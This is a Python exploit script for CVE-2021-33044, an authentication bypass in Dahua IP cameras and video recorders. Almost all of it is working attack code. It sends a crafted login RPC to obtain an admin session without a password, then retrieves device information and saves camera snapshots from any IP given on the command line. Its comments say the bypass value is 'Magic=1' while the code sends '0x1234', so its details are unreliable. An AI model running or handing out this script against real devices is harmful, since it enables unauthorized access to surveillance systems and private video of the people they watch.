#!/usr/bin/env python3
"""
CVE-2021-33044 — Dahua IP Camera Authentication Bypass
Magic packet in the login request bypasses credential validation.

Affected: Dahua IPC, NVR, XVR — multiple firmware versions before Oct 2021
CVSS:     9.8 CRITICAL
Usage:    python3 dahua_cve_2021_33044.py <target_ip> [port]
"""

import sys
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _rpc_request(base_url: str, method: str, params: dict,
                 session: str = None, session_id: int = None,
                 timeout: int = 10) -> requests.Response:
    payload = {
        "method": method,
        "params": params,
        "id":     session_id or 1,
    }
    if session:
        payload["session"] = session

    return requests.post(
        f"{base_url}/RPC2",
        json=payload,
        verify=False,
        timeout=timeout,
    )


def exploit(target_ip: str, port: int = 80) -> dict:
    """
    Authentication bypass via Magic field in Login RPC:
    1. Call global.login to get a challenge
    2. Replay with Magic=1 — server accepts without valid password
    """
    base = f"http://{target_ip}:{port}"
    result = {"ip": target_ip, "port": port, "vulnerable": False,
              "session": None, "error": ""}

    # Step 1 — get challenge
    try:
        r1 = _rpc_request(base, "global.login", {
            "userName":  "admin",
            "password":  "",
            "clientType": "Web3.0",
        })
        if r1.status_code != 200:
            result["error"] = f"HTTP {r1.status_code} on initial request"
            print(f"[-] {target_ip}:{port} — HTTP {r1.status_code}")
            return result

        data1 = r1.json()
        params1 = data1.get("params", {})
        realm   = params1.get("realm",   "")
        random_ = params1.get("random",  "")
        print(f"[*] Challenge — realm={realm!r} random={random_!r}")
    except Exception as e:
        result["error"] = str(e)
        print(f"[-] Step 1 failed: {e}")
        return result

    # Step 2 — bypass with Magic=1
    try:
        r2 = _rpc_request(base, "global.login", {
            "userName":   "admin",
            "password":   "",
            "clientType": "Web3.0",
            "authorityType": "Default",
            "loginType":  "Direct",
            "Magic":      "0x1234",          # bypass trigger
        }, session_id=2)

        data2 = r2.json()
        session_token = data2.get("session")

        if session_token and data2.get("result") is True:
            result["vulnerable"] = True
            result["session"]    = session_token
            print(f"[+] {target_ip}:{port} — VULNERABLE to CVE-2021-33044")
            print(f"[+] Session token: {session_token}")
            _post_exploit(base, session_token, target_ip)
        else:
            # Some firmwares return result=False but with a usable session
            if session_token:
                result["vulnerable"] = True
                result["session"]    = session_token
                print(f"[!] {target_ip}:{port} — Possibly vulnerable (session returned)")
                _post_exploit(base, session_token, target_ip)
            else:
                print(f"[-] {target_ip}:{port} — Not vulnerable (no session token)")
    except Exception as e:
        result["error"] = str(e)
        print(f"[-] Step 2 failed: {e}")

    return result


def _post_exploit(base_url: str, session: str, target_ip: str):
    """Demonstrate impact — pull device info and try snapshot."""
    try:
        r = _rpc_request(base_url, "magicBox.getSystemInfo", {}, session=session)
        info = r.json().get("params", {})
        if info:
            print(f"[+] Device info: {json.dumps(info, indent=2)[:400]}")
    except Exception:
        pass

    # Try HTTP snapshot (alternate auth path)
    for path in ["/cgi-bin/snapshot.cgi", "/cgi-bin/mjpg/video.cgi"]:
        try:
            snap = requests.get(
                f"{base_url}{path}",
                cookies={"DhWebClientSessionID": session},
                verify=False, timeout=8,
            )
            if snap.status_code == 200 and len(snap.content) > 2048:
                ip = base_url.split("//")[1].split(":")[0]
                fname = f"dahua_snapshot_{ip}.jpg"
                with open(fname, "wb") as f:
                    f.write(snap.content)
                print(f"[+] Snapshot saved → {fname} ({len(snap.content)} bytes)")
                break
        except Exception:
            pass


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip> [port]")
        print(f"       {sys.argv[0]} 192.168.1.108")
        print(f"       {sys.argv[0]} 192.168.1.108 8080")
        sys.exit(1)

    ip   = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    print(f"[*] Target : {ip}:{port}")
    print(f"[*] CVE    : CVE-2021-33044 — Dahua Auth Bypass\n")

    exploit(ip, port)


if __name__ == "__main__":
    main()
